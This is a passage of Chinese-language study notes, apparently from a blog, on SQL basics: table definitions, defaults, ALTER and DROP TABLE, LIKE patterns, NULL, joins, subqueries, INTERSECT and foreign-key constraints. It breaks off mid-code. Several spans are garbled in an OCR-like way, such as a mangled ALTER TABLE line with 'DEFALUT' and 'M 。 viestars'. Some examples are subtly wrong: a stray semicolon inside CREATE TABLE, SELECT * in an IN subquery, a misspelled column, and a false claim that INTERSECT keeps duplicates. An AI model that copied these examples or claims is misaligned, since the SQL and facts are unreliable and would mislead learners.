class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line">    birthdate DATETIME,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> gender_check <span class="keyword">CHECK</span>(gender <span class="keyword">in</span> (<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;M&#x27;</span>));</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="设置默认值"><a href="#设置默认值" class="headerlink" title="设置默认值"></a>设置默认值</h5><p>可以在创建关系时给属性设置默认值，插入元组时如果没有给该属性赋值，该属性的值就用默认替代。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">    name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>),</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">    birthdate DATETIME <span class="keyword">DEFAULT</span> <span class="string">&#x27;0000-00-00&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="修改关系模式"><a href="#修改关系模式" class="headerlink" title="修改关系模式"></a>修改关系模式</h4><p>使用 <code>DROP TABLE</code> 语句删除关系模式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> MovieStars;</span><br></pre></td></tr></table></figure><p>从数据库模式中删除 M 。 viestars 模式，包括里面的元组也一起删除。</p><p>使用 <code>ALTER TABLE</code> 语句更改关系模式</p><ul><li><p>使用 <code>ADD</code> 子句添加属性和约束</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> Movi eStars AD D mob i <span class="operator">|</span> e <span class="type">NCHAR</span> （ <span class="number">1</span> <span class="number">1</span>) DEFALUT <span class="string">&#x27;unlisted&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>使用 <code>DROP</code> 子句删除属性和约束</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER TABLE</span> MovieStars <span class="keyword">DROP</span> mobile;</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQL中的投影"><a href="#SQL中的投影" class="headerlink" title="SQL中的投影"></a>SQL中的投影</h4><p>用<code>SELECT</code>字句对结果关系进行投影，选出我们要的列。</p><p>可以用 <code>AS</code>在列投影出来后进行改名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title <span class="keyword">AS</span> name, lenth duration <span class="comment">-- title 改为 name, length 改为 duration</span></span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> studioName <span class="operator">=</span> <span class="string">&#x27;Disney&#x27;</span> <span class="keyword">AND</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注：AS可以省略，只要列名与别名之间保留空格就行</span></span><br></pre></td></tr></table></figure><p>投影的对象可以是属性，也可以是<strong>表达式</strong></p><ul><li>用表达式取代属性</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title name, length<span class="operator">/</span><span class="number">60.0</span> lengthInHours, <span class="string">&#x27;hours&#x27;</span> inHours</span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> studioName <span class="operator">=</span> <span class="string">&#x27;Disney&#x27;</span> <span class="keyword">AND</span> <span class="keyword">year</span> <span class="operator">=</span> <span class="number">2019</span></span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/12.png" alt="06"></p><h4 id="输出排序"><a href="#输出排序" class="headerlink" title="输出排序"></a>输出排序</h4><p>对查询结果的元组以某种顺序表示</p><p><code>ORDER BY</code> 属性列表 <code>ASC/DESC</code></p><ul><li>排序是在 <code>FROM</code> 、 <code>WHERE</code> 等子句的结果上进行，排序之后再执行 <code>SELECT</code> 子句。</li><li>排序列可以是表达式： <code>ORDER BY A+ B DESC</code></li><li>排序默认是升序 <code>ASC</code> ，也可以指定按降序 <code>DESC</code> 排序。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> studioName <span class="operator">=</span> <span class="string">&#x27;Disney&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> length, title <span class="keyword">DESC</span> <span class="comment">-- 先按length升序，再按title降序</span></span><br></pre></td></tr></table></figure><h3 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h3><p><code>str LIKE pattern</code></p><p>其中<code>str</code>是字符串，<code>pattern</code>是使用通配符表示的模式，通配符有以下这些：</p><ul><li><code>%</code>，表示任意长度的字符串</li><li><code>_</code>，表单单个字符</li><li><code>[ ]</code>，指定括号里的任意单个字符</li><li><code>[^]</code>，占位的字符不是括号里的任意字符</li></ul><p>注意区分:</p><ul><li><code>s%</code>: 以 s 开头的字符串</li><li><code>%s</code>: 以 s 结尾的字符串</li><li><code>%s%</code>：含有 s 的字符串</li></ul><p>如果匹配模式中有单引号的模糊匹配：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title</span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> title <span class="keyword">LIKE</span> <span class="string">&#x27;%&#x27;&#x27; s%&#x27;</span>;</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;注： SQL 中约定两个连续的单引号表示一个单引号&#x3D;&#x3D;</p><p>如果匹配模式中带有<code>%</code>或者<code>_</code>等特殊字符需要匹配的话，需要用：</p><p><strong>SQL中用<code>ESCAPE &#39;x&#39;</code>来指定任意字符x临时担任转义字符</strong>:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s <span class="keyword">LIKE</span> <span class="string">&#x27;x%%x_&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;x&#x27;</span></span><br><span class="line">x 是转义字符，</span><br><span class="line">x<span class="operator">%</span> 表示字符串以<span class="operator">%</span>开头</span><br><span class="line"><span class="operator">%</span> 表示任意长的字符串</span><br><span class="line">x_ 表示字符串以_结尾</span><br></pre></td></tr></table></figure><h3 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h3><p>两个字符串进行拼接的运算符：<strong>+</strong></p><p><code>&#39;ABC &#39; + &#39;D &#39; = &#39;ABC D &#39;</code></p><ul><li>要求运算符两边均是字符串</li><li>拼接时左右两边的空格均保留</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title<span class="operator">+</span>StudioName ts</span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br></pre></td></tr></table></figure><h3 id="SQL中的NULL"><a href="#SQL中的NULL" class="headerlink" title="SQL中的NULL"></a>SQL中的NULL</h3><p>SQL 中的空值 NULL, 有许多不同的解释：</p><ul><li>未知值：知道它有一个值但不知道是什么，如在 MovieStars 表中某个影星的生日不知道。</li><li>不适用的值：表示任何值在这里都没有意义，在 MovieStars 表中如果有一列用来描述影星的配偶的姓名，如果该影星单身，该属性只能是空，给任何具体值都不符合实情。</li><li>保留的值：属于某对象但无权知道的值，一般用在权限不足以获取实际取值时， M 。 viestars 表中如果有一属性用来描述影星的手机，该属性的值常常为 NULL</li></ul><p>NULL 的运算规则</p><ul><li>NULL 和其他任何值的算术运算结果都是 NULL</li><li>NULL 是一个特殊值，但又不算是一个常量，不能给NULL赋值</li><li>判断 x 的值是否为空值，不能用等号**&#x3D;**<ul><li>x IS NULL           x 为空时，结果为 TRUE<br>  x IS NOT NULL   x 不为空时，结果为 TRUE</li></ul></li></ul><h3 id="多关系查询"><a href="#多关系查询" class="headerlink" title="多关系查询"></a>多关系查询</h3><p>笛卡尔积：π<del>a1,a2</del>(R<del>1</del> × R<del>2</del>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a1, a2     (投影)</span><br><span class="line"><span class="keyword">FROM</span> R1, R2       (积的运算)</span><br></pre></td></tr></table></figure><p>θ 连接：π<del>a1,a2</del>(σ<del>cond</del> (R<del>1</del> × R<del>2</del>) )</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a1, a2</span><br><span class="line"><span class="keyword">FROM</span> R1, R2</span><br><span class="line"><span class="keyword">WHERE</span> cond       (选择运算)</span><br></pre></td></tr></table></figure><p>自然连接：π<del>a1,a2</del>(σ<del>cond</del> (R<del>1</del> ⋈ R<del>2</del>) )</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a1, a2</span><br><span class="line"><span class="keyword">FROM</span> R1, R2</span><br><span class="line"><span class="keyword">WHERE</span> cond <span class="keyword">AND</span> R1.r1<span class="operator">=</span>R2.r2</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/06.png" alt="06"></p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/07.png" alt="06"></p><h3 id="SQL中的积和连接（用JOIN实现连接）"><a href="#SQL中的积和连接（用JOIN实现连接）" class="headerlink" title="SQL中的积和连接（用JOIN实现连接）"></a>SQL中的积和连接（用JOIN实现连接）</h3><p>积：笛卡尔积：π<del>a1,a2</del>(R<del>1</del> × R<del>2</del>)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a1, a2             (投影)</span><br><span class="line"><span class="keyword">FROM</span> R1 <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> R2     (积的运算) <span class="operator">=</span> <span class="keyword">FROM</span> R1, R2</span><br></pre></td></tr></table></figure><h4 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h4><p><strong>内连接</strong>：先自然连接 + 再 θ 连接，或者先 θ 连接 + 再选择</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a1, a2</span><br><span class="line"><span class="keyword">FROM</span> R1 <span class="keyword">INNER</span> <span class="keyword">JOIN</span> R2 <span class="keyword">ON</span> R1.r1 <span class="operator">=</span> R2.r2     (<span class="keyword">INNER</span>可省略)</span><br><span class="line"><span class="keyword">WHERE</span> cond</span><br><span class="line">等同于</span><br><span class="line"><span class="keyword">SELECT</span> a1, a2</span><br><span class="line"><span class="keyword">FROM</span> R1, R2</span><br><span class="line"><span class="keyword">WHERE</span> R1.r1 <span class="operator">=</span> R2.r2 <span class="keyword">AND</span> cond</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/08.png" alt="08"></p><h4 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h4><p>外连接分为<strong>左外连接</strong>、<strong>右外连接</strong>和<strong>全外连接</strong></p><h4 id="左连接"><a href="#左连接" class="headerlink" title="左连接"></a>左连接</h4><p><strong>左外连接</strong>的结果返回左表的<strong>所有数据行</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> R <span class="keyword">LEFT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> S <span class="keyword">ON</span> R.A <span class="operator">=</span> S.A         (<span class="keyword">OUTER</span>可省略)</span><br></pre></td></tr></table></figure><p>左表与右表做有条件的笛卡尔积，先遍历左元组，内嵌遍历右元组，如果符合条件就连接两个元组；右元组如果遍历完没有符合条件，仍然在新关系中加上左元组，但是右元组的所有属性设为 <code>NULL</code>。</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/09.png" alt="09"></p><h4 id="右连接"><a href="#右连接" class="headerlink" title="右连接"></a>右连接</h4><p><strong>右外连接</strong>的结果返回右表的<strong>所有数据行</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> R <span class="keyword">RIGHT</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> S <span class="keyword">ON</span> R.A <span class="operator">=</span> S.A         (<span class="keyword">OUTER</span>可省略)</span><br></pre></td></tr></table></figure><p>与左外连接相同，只不过是先遍历右元组再内嵌遍历左元组。在都不符合条件的情况下，新的关系上添加右元组，左元组的所有属性设为 <code>NULL</code>。</p><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/10.png" alt="10"></p><p>&#x3D;&#x3D;R RIGHT JOIN S 等同于 S LEFT JOIN&#x3D;&#x3D;</p><h4 id="全外连接"><a href="#全外连接" class="headerlink" title="全外连接"></a>全外连接</h4><p><strong>全外连接</strong>，是左外连接和右外连接的结合。</p><p>符合条件的元组都一样直接加上去，不符合条件的左外连接和右外连接各来一次</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> R <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> S <span class="keyword">ON</span> R.A <span class="operator">=</span> S.A         (<span class="keyword">OUTER</span>可省略)</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/ch4/11.png" alt="11"></p><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>当某个查询是另一查询的一部分时称该查询为子查询，另一查询称为父查询。</p><ul><li>子查询可以用 <code>INTERSECTS</code> <code>EXCEPT</code> 和 <code>UNION</code>连接起来</li><li>子查询可以返回单个常量，能与父查询中 <code>WHERE</code> 子句的常量进行比较。</li><li>子查询能返回关系，可被父查询的 <code>WHERE</code> 子句以不同的方式使用。</li><li>子查询返回的关系，可以出现在 <code>FROM</code> 子句中</li></ul><p><strong>EXISTS</strong> 子查询</p><p><code>[NOT] EXISTS R</code>，当且仅当子查询结果R非空时，表达式的值为真</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询参演‘红海行动’的影星</span></span><br><span class="line"><span class="keyword">SELECT</span> starName</span><br><span class="line"><span class="keyword">FROM</span> StarsIN</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> </span><br><span class="line">    <span class="keyword">FROM</span> Movies</span><br><span class="line">    <span class="keyword">WHERE</span> StarsIn.movieTitle <span class="operator">=</span> Movies.title</span><br><span class="line">      <span class="keyword">AND</span> Movies.title <span class="operator">=</span> <span class="string">&#x27;红海行动&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>IN</strong> 子查询</p><p><code>[NOT] s IN R</code>，当且仅当s等于R中的某一个值时，表达式为真</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询有女影星出演的电影</span></span><br><span class="line"><span class="keyword">SELECT</span> movieTitle</span><br><span class="line"><span class="keyword">FROM</span> StarsIn</span><br><span class="line"><span class="keyword">WHERE</span> starName <span class="keyword">IN</span> (</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> MovieStars</span><br><span class="line">    <span class="keyword">WHERE</span> gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当子查询的结果不止一个元组时，用 “IN”</p><p>当子查询的结果只有一个元组，可以用 “&#x3D;”</p><p><strong>ALL</strong> 子查询</p><p><code>[NOT] s &gt; ALL R</code>，当且仅当子s比R的所有值都大时，表达式的值为真</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询哪部影片的放映时间最长</span></span><br><span class="line"><span class="keyword">SELECT</span> title</span><br><span class="line"><span class="keyword">FROM</span> Movies</span><br><span class="line"><span class="keyword">WHERE</span> length <span class="operator">&gt;=</span> <span class="keyword">ALL</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> length <span class="keyword">FROM</span> Movies</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><strong>ANY</strong> 子查询</p><p><code>[NOT] s &gt; ANY R</code>，当且仅当s至少大于R中某个值非空时，表达式的值为真</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 查询被两部或两部以上电影使用过的电影名</span></span><br><span class="line"><span class="keyword">SELECT</span> title, <span class="keyword">year</span></span><br><span class="line"><span class="keyword">FROM</span> Movies m1</span><br><span class="line"><span class="keyword">WHERE</span> m1.year <span class="operator">&gt;</span> <span class="keyword">ANY</span> (</span><br><span class="line"><span class="keyword">SELECT</span> m2.year</span><br><span class="line">    <span class="keyword">FROM</span> Movies m2</span><br><span class="line">    <span class="keyword">WHERE</span> m1.tile <span class="operator">=</span> m2.title</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>子查询输出同名影片制作时间，父查询输出年份最近同名电影</p><p><strong>FROM 子句中的子查询</strong></p><p>查询结果作为关系直接用于 FROM 子句，应当括起并给予别名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name</span><br><span class="line"><span class="keyword">FROM</span> MovieExec, (<span class="keyword">SELECT</span> ProducerC#</span><br><span class="line">                 <span class="keyword">FROM</span> Movies, StarsIn</span><br><span class="line">                 <span class="keyword">WHERE</span> Movies.title <span class="operator">=</span> StarsIn.movieTitle</span><br><span class="line">                 <span class="keyword">AND</span> Movies.year <span class="operator">=</span> StarsIn.movieYear</span><br><span class="line">                 <span class="keyword">AND</span> StarsIN.starName <span class="operator">=</span> <span class="string">&#x27;黄渤&#x27;</span>) Prod</span><br><span class="line"><span class="keyword">WHERE</span> cert# <span class="operator">=</span> Prod.producerC#</span><br></pre></td></tr></table></figure><h3 id="交操作"><a href="#交操作" class="headerlink" title="交操作"></a>交操作</h3><p>用保留字 INTERSECT 表示交操作</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 找出那些即是女影星同时又是超过 1 亿资产的制片人的名字和地址</span></span><br><span class="line">(<span class="keyword">SELECT</span> name address <span class="keyword">FROM</span> MovieStars <span class="keyword">WHERE</span> gender<span class="operator">=</span> <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line">(<span class="keyword">SELECT</span> name address <span class="keyword">FROM</span> MovieExecs <span class="keyword">WHERE</span> netWorth<span class="operator">&gt;</span><span class="number">100000000</span>)</span><br></pre></td></tr></table></figure><p>交操作不会消除两个相等的元素，而是把两个相等的元组一起放入新的关系中</p><h2 id="约束和触发器"><a href="#约束和触发器" class="headerlink" title="约束和触发器"></a>约束和触发器</h2><ul><li>约束是存储在数据库中的表达式或语句</li><li>当某个时间发生或数据库更改时执行，约束主动起作用</li><li>SQL Server提供完整性约束包括<ul><li>键</li><li>参照完整性</li><li>域约束、检查约束（check)</li><li>断言</li></ul></li><li>SQL提供触发器：在某些指定事件上被主动调用，也是一种约束</li></ul><h4 id="基于属性（元组）的约束"><a href="#基于属性（元组）的约束" class="headerlink" title="基于属性（元组）的约束"></a>基于属性（元组）的约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>) <span class="keyword">CHECK</span> (gender <span class="keyword">in</span> (<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)),</span><br><span class="line">    birthdate DATETIME</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> MovieStars (</span><br><span class="line">name <span class="type">NCHAR</span>(<span class="number">30</span>) <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    address NVARCHAR(<span class="number">255</span>) <span class="keyword">UNIQUE</span> <span class="keyword">NOT NULL</span>,</span><br><span class="line">    gender <span class="type">CHAR</span>(<span class="number">1</span>),</span><br><span class="line">    birthdate DATETIME,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> gender_check <span class="keyword">CHECK</span>(gender <span class="keyword">in</span> (<span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;M&#x27;</span>));</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="定义参照完整性约束（外键）"><a href="#定义参照完整性约束（外键）" class="headerlink" title="定义参照完整性约束（外键）"></a>定义参照完整性约束（外键）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">CHAR</span>(<span class="number">100</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">REFERENCES</span> Studios(name), <span class="comment">-- 它要参照Studios关系里的name属性</span></span><br><span class="line">    producerC <span class="type">INT</span> <span class="keyword">REFERENCES</span> MovieExecs(cert),  <span class="comment">-- 它要参照MovieExecs关系里的cert属性</span></span><br><span class="line">    <span class="keyword">PRIMARY KEY</span>(title, <span class="keyword">year</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">CHAR</span>(<span class="number">100</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName <span class="type">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    producerC <span class="type">INT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span>(title, <span class="keyword">year</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以引用同一个表中的字段。比如 Students(id, name, depid, monitorid)<br><code>FOREGIN KEY(monitorid) REFERENCES id</code></p><p>可以声明一个具有空值的外键</p><p>在 Movies 关系中已定义了参照完整性（或者说数据一致性）， DBMS 为维护参照完整性，将阻止下列操作。</p><ul><li><p>对参照关系 <code>Movies</code> 操作的阻止</p><ul><li>插入新元组到<code>Movies</code> ，若新元组的 <code>producerC#</code> 不为空且不是 MovieExecs 任何元组的 <code>cert#</code> 值</li><li>修改<code>Movies</code>元组，其 <code>producerC#</code> 不为空且不是 <code>MovieExecs</code> 任何元组的 <code>cert#</code> 值</li></ul></li><li><p>对被参照关系 <code>MovieExecs</code> 操作的阻止</p><ul><li>删除 <code>MovieExecs</code> 元组，该元组的 cert# 非空且被 <code>Movies</code> 的 <code>producerC#</code> 引用</li><li>修改 <code>MovieExecs</code> 元组 <code>cert#</code> 值，但该<code> cert#</code> 值被 <code>Movies</code> 的<code> producerC#</code> 引用。也就是说<code>cert#</code>被指向了，那么它就不能被修改，防止引用失效（野指针）。这是拒绝原则控制的。</li></ul><p>  其实如果要修改<strong>被引用</strong>属性的值也不是不可以（<code>MovieExecs.cert#</code>），不过要满足以下三个原则（原则其一即可）来保证参照完整性</p><ol><li><p><strong>拒绝原则</strong>（DBMS的默认原则）</p><p> 拒绝任何违反参照完整性约束的更新。若 <code>MovieExecs</code> 关系中某个元组的 <code>cert#</code> 被 <code>Movies</code> 中 <code>producerC#</code> 参照引用，那么不能对该元组的 <code>cert#</code>进行更新操作。</p></li><li><p>级联原则（同时更新）</p><p> 若 <code>MoviesExecs</code> 中被参照的 <code>cert#</code> 值发生了更新，那对应的 <code>Movies</code> 中的 <code>producerC#</code> 值也同时发生更新。</p></li><li><p>置空原则（置零）</p><p> 若 <code>MovieExecs</code> 中被参照的 <code>cert#</code> 值发生了更新，那对应的 <code>Movies</code> 中<code>producerC#</code>的值置为空。</p></li></ol>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> Movies (</span><br><span class="line">title <span class="type">CHAR</span>(<span class="number">100</span>),</span><br><span class="line">    <span class="keyword">year</span> <span class="type">INT</span>,</span><br><span class="line">    length <span class="type">INT</span>,</span><br><span class="line">    genre <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    studioName <span class="type">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line">    producerC <span 